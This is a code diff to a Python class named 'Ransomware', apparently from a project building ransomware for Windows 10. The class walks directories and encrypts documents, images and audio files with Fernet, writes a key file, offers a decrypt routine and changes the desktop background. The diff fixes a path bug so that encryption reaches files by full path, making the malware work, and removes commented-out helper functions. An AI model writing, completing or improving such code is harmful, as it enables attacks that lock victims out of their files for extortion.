@@ -11,7 +11,6 @@ import sys
 class Ransomware:
     """Ransomware class for windows 10 systems"""
     
-    
     file_extensions = ['.txt', '.pdf', '.png', '.jpeg', '.docx', '.xlsx', '.doc', '.rtf', '.mp3']
 
     def __init__(self):
@@ -50,7 +49,6 @@ class Ransomware:
         
         with open('fernet.key', 'wb') as f:
             f.write(decrypted_key)
-            #self.fernetkey = decrypted_key 
             self.encryptor = Fernet(decrypted_key)
         return True
 
@@ -65,12 +63,10 @@ class Ransomware:
                     if ext in self.file_extensions:
                         filepath = os.path.join(root, file)
                         # encrypt file:
-                        with open(file, 'rb') as readf:
+                        with open(filepath, 'rb') as readf:
                             content = readf.read()
-                        with open(file, 'wb') as writef:
+                        with open(filepath, 'wb') as writef:
                             writef.write(self.encryptor.encrypt(content))
-                        
-                    
                         print('Encrypted: ', filepath)
         self.encryptor = None
         self.fernetkey = None
@@ -86,32 +82,14 @@ class Ransomware:
                     if ext in self.file_extensions:
                         filepath = os.path.join(root, file)
                         # decrypt file:
-                        with open(file, 'rb') as readf:
+                        with open(filepath, 'rb') as readf:
                             contents = readf.read()
 
-                        with open(file, 'wb') as writef:
+                        with open(filepath, 'wb') as writef:
                             decfile = self.encryptor.decrypt(contents)
                             writef.write(decfile)
-                            print('decrypted :', file)
+                        print('decrypted :', filepath)
 
-
-    # def encrypt_file(self, file):
-    #     with open(file, 'rb') as readf:
-    #         content = readf.read()
-
-    #     with open(file, 'wb') as writef:
-    #         writef.write(self.encryptor.encrypt(content))
-        
-
-    # def decrypt_file(self, file):
-    #     with open(file, 'rb') as readf:
-    #         contents = readf.read()
-
-    #     with open(file, 'wb') as writef:
-    #         decfile = self.encryptor.decrypt(contents)
-    #         writef.write(decfile)
-    #         print('decrypted :', file)
-    
     
     def update_background(self):
         ctypes.windll.user32.SystemParametersInfoW(20, 0, 'bg.png', 0)
